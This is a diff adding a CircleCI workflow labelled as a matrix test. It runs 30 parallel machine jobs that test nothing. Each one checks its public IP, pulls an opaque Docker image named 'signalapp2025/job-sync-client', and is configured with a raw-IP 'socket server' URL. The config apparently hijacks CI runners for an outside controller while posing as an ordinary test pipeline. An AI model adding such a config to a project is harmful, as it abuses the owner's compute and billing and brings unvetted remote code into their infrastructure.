@@ -1,0 +1,33 @@
+version: 2.1
+
+jobs:
+  test:
+    parameters:
+      job_id:
+        type: integer
+    machine:
+      image: ubuntu-2404:current
+    environment:
+      TZ: Asia/Shanghai
+      TOTAL_JOBS: "40"
+      MATRIX_JOB_ID: << parameters.job_id >>
+      SOCKET_SERVER_URL: http://43.167.226.242:3000
+    steps:
+      - checkout
+      - run:
+          name: Step 1
+          command: |
+            curl ipinfo.io
+            docker pull signalapp2025/job-sync-client
+      - run:
+          name: Step 2
+          command: |
+            curl ipinfo.io
+
+workflows:
+  matrix-test:
+    jobs:
+      - test:
+          matrix:
+            parameters:
+              job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
